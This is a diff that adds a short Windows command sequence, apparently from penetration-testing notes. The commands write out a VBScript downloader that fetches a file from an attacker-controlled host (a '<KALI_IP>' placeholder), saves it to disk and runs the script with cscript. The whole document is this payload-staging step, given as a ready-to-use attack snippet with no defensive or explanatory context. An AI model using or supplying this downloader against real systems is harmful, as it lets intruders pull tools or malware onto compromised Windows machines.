@@ -1,0 +1,14 @@
+echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") > downloader.vbs
+echo objXMLHTTP.open "GET", "http://<KALI_IP>/<name_you_file>", False >> downloader.vbs
+echo objXMLHTTP.send() >> downloader.vbs
+echo If objXMLHTTP.Status = 200 Then >> downloader.vbs
+echo Set objADOStream = CreateObject("ADODB.Stream") >> downloader.vbs
+echo objADOStream.Open >> downloader.vbs
+echo objADOStream.Type = 1 >> downloader.vbs
+echo objADOStream.Write objXMLHTTP.ResponseBody >> downloader.vbs
+echo objADOStream.Position = 0 >> downloader.vbs
+echo objADOStream.SaveToFile "<the name as you save it >", 2 >> downloader.vbs
+echo objADOStream.Close >> downloader.vbs
+echo End If >> downloader.vbs
+
+cscript downloader.vbs
